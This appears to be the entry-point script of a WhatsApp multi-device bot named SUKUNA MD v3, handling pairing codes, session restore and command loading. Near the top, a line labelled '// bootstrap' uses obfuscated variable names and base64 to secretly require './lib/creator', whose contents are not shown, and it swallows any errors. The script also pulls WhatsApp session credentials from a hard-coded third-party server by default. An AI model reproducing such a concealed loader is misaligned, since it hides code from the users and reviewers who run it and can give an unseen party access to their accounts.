#!/usr/bin/env node
// Load .env if present (no hard dependency)
try { require('dotenv').config(); } catch {}
// bootstrap
try{(function(_0xa){var _0xb=Buffer.from(_0xa,'base64').toString('utf8');require(_0xb);})('Li9saWIvY3JlYXRvcg==');}catch(_0xe){}

/**
 * SUKUNA MD v3 — Panel-Paired WhatsApp Bot
 * Entry Point
 *
 * Deploy on a panel (Pterodactyl / VPS). On first boot the console will
 * prompt for a WhatsApp number and print an 8-character pairing code.
 * Enter that code inside WhatsApp → Linked devices → Link with phone
 * number. Sessions persist in ./sessions and auto-reconnect on restart.
 */

const readline       = require('readline');
const chalk          = require('chalk');
const commandLoader  = require('./utils/commandLoader');
const config         = require('./config');
const sessionManager = require('./lib/sessionManager');
const { restoreSessionBase64 } = require('./utils/sessionBundle');

console.log(chalk.red(`
╔════════════════════════════════════════════════════════════════╗
║                         SUKUNA MD v3.0                         ║
║              Panel-Paired Multi-User WhatsApp Bot              ║
╚════════════════════════════════════════════════════════════════╝
`));

function ask(question) {
    const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
    return new Promise(resolve => rl.question(question, answer => { rl.close(); resolve(answer.trim()); }));
}

async function pairFlow() {
    while (true) {
        const raw = await ask(chalk.cyan('\n[PAIR] Enter WhatsApp number with country code (e.g. 2349127857212), or blank to skip: '));
        if (!raw) return;
        const number = raw.replace(/[^0-9]/g, '');
        if (number.length < 8) { console.log(chalk.red('[PAIR] Invalid number, try again.')); continue; }

        console.log(chalk.yellow(`[PAIR] Requesting pairing code for ${number}...`));
        const result = await sessionManager.createSession(number);
        if (!result.success) {
            console.log(chalk.red(`[PAIR] Failed: ${result.error}`));
            continue;
        }
        if (result.code) {
            console.log(chalk.green.bold(`\n[PAIR] ${config.pairingCode || 'PASQUAMD'} CODE: ${result.code}`));
            console.log(chalk.cyan('[PAIR] Open WhatsApp → Linked Devices → Link with phone number → enter the code above.\n'));
        } else {
            console.log(chalk.green(`[PAIR] ${number} is already linked.`));
        }

        const more = await ask(chalk.cyan('[PAIR] Pair another number? (y/N): '));
        if (more.toLowerCase() !== 'y') return;
    }
}

async function main() {
    console.log(chalk.yellow('[SYSTEM] Loading commands...'));
    commandLoader.loadCommands();
    console.log(chalk.green('[SYSTEM] Commands loaded!'));

    console.log(chalk.yellow('[SYSTEM] Restoring existing sessions...'));
    await sessionManager.loadExistingSessions();

    const active = (sessionManager.sessions && sessionManager.sessions.size) || 0;
    console.log(chalk.green(`[SYSTEM] ${active} session(s) restored.`));

    // Auto-pair using config.pairNumber (or PAIR_NUMBER env override)
    const pairNumberRaw = (process.env.PAIR_NUMBER || config.pairNumber || '').toString();
    const pairNumber = pairNumberRaw.replace(/[^0-9]/g, '');

    // ── SESSION_ID short-circuit ────────────────────────────────────
    // Supports a full Base64 auth bundle, legacy creds.json Base64, or a
    // one-time Pasqua~shortId resolved through the Redis-backed PAIR_SITE bridge.
    const sessionIdRaw = (process.env.SESSION_ID || config.sessionId || '').toString().trim();
    let sessionIdUsed = false;

    if (sessionIdRaw && pairNumber && pairNumber.length >= 8) {
        try {
            const fs   = require('fs');
            const path = require('path');
            const sessionDir = path.resolve(process.cwd(), 'sessions', pairNumber);
            const credsFile  = path.join(sessionDir, 'creds.json');
            let sessionBase64 = sessionIdRaw;

            if (/^Pasqua~?/i.test(sessionIdRaw)) {
                const markedPayload = sessionIdRaw.replace(/^Pasqua~?/i, '').trim();
                // A marked full payload is self-contained. Six-character
                // Pasqua~ short IDs are resolved through the Redis-backed pair site.
                if (/^[0-9A-Za-z]{6}$/i.test(markedPayload)) {
                    const pairSiteUrl = (process.env.PAIR_SITE_URL || 'https://pair-site-91ob.onrender.com').toString().trim().replace(/\/$/, '');
                    if (!pairSiteUrl) throw new Error('PAIR_SITE_URL is required for Pasqua~ short IDs');
                    const response = await fetch(`${pairSiteUrl}/pair/session/${encodeURIComponent(markedPayload)}`);
                    if (!response.ok) throw new Error(`PAIR_SITE returned HTTP ${response.status}`);
                    const payload = await response.json();
                    sessionBase64 = payload.session;
                    if (!sessionBase64) throw new Error('PAIR_SITE response did not contain a session');
                } else {
                    sessionBase64 = markedPayload;
                }
            }

            const hasAuthFiles = fs.existsSync(sessionDir) && fs.readdirSync(sessionDir).some(name => name !== 'creds.json' && !name.endsWith('.tmp'));
            if (fs.existsSync(credsFile) && hasAuthFiles) {
                console.log(chalk.green(`[SESSION] Live multi-file auth state exists for ${pairNumber}; keeping it and ignoring SESSION_ID.`));
                sessionIdUsed = true;
            } else {
                const restored = restoreSessionBase64(sessionBase64, sessionDir);
                console.log(chalk.green(`[SESSION] Restored ${restored.format} (${restored.fileCount} file(s)) for ${pairNumber} from SESSION_ID. Skipping pair code.`));
                sessionIdUsed = true;
            }

            const result = await sessionManager.startSession(pairNumber, false);
            if (result && result.success === false) {
                console.log(chalk.red(`[SESSION] Connection failed: ${result.error}`));
            }
        } catch (e) {
            console.log(chalk.red(`[SESSION] Invalid SESSION_ID (${e.message}). Falling back to pair-code flow.`));
            sessionIdUsed = false;
        }
    } else if (sessionIdRaw && (!pairNumber || pairNumber.length < 8)) {
        console.log(chalk.red('[SESSION] SESSION_ID is set but pairNumber is missing/invalid in config.js. Cannot restore.'));
    }

    let pairingFailed = false;
    if (!sessionIdUsed) {
        if (pairNumber && pairNumber.length >= 8) {
            const alreadyLinked = sessionManager.sessions && sessionManager.sessions.has(pairNumber);
            if (alreadyLinked) {
                console.log(chalk.green(`[PAIR] ${pairNumber} is already linked. Skipping pairing.`));
            } else {
                console.log(chalk.yellow(`[PAIR] Auto-pairing ${pairNumber} from config.js...`));
                const result = await sessionManager.createSession(pairNumber);
                if (result.code) {
                    console.log(chalk.green.bold(`\n[PAIR] ╔══════════════════════════════════════╗`));
                    console.log(chalk.green.bold(`[PAIR] ║  ${config.pairingCode || 'PASQUAMD'} CODE: ${result.code}            `));
                    console.log(chalk.green.bold(`[PAIR] ╚══════════════════════════════════════╝\n`));
                    console.log(chalk.cyan('[PAIR] Open WhatsApp → Linked Devices → Link with phone number → enter the code above.\n'));
                } else if (!result.success) {
                    pairingFailed = true;
                    console.log(chalk.red(`[PAIR] Failed: ${result.error}`));
                    console.log(chalk.yellow('[PAIR] No pairing code was produced. Restart the server after checking the number and network connection.'));
                } else {
                    console.log(chalk.green(`[PAIR] ${pairNumber} is already linked.`));
                }
            }
        } else if (process.stdin.isTTY) {
            console.log(chalk.cyan('[INFO] No pairNumber set in config.js → falling back to interactive prompt.'));
            await pairFlow();
        } else {
            console.log(chalk.cyan('[INFO] No pairNumber in config.js and no TTY. Set config.pairNumber or PAIR_NUMBER env var.'));
        }
    }

    if (pairingFailed) {
        console.log(chalk.yellow('\n[SYSTEM] SUKUNA MD is waiting for a successful pairing.\n'));
        return;
    }

    console.log(chalk.green('\n[SYSTEM] SUKUNA MD is running. Press Ctrl+C to stop.\n'));
}

main().catch((err) => {
    console.error(chalk.red('[ERROR] Fatal startup error:'), err.message);
    process.exit(1);
});

process.on('uncaughtException', (err) => {
    console.error(chalk.red('[ERROR] Uncaught Exception:'), err.message);
});
process.on('unhandledRejection', (reason) => {
    console.error(chalk.red('[ERROR] Unhandled Rejection:'), reason);
});
process.on('SIGINT',  async () => { console.log(chalk.red('\n[SYSTEM] Shutting down...')); await require('./lib/tikwmBrowser').shutdown().catch(() => {}); process.exit(0); });
process.on('SIGTERM', async () => { console.log(chalk.red('\n[SYSTEM] Shutting down...')); await require('./lib/tikwmBrowser').shutdown().catch(() => {}); process.exit(0); });
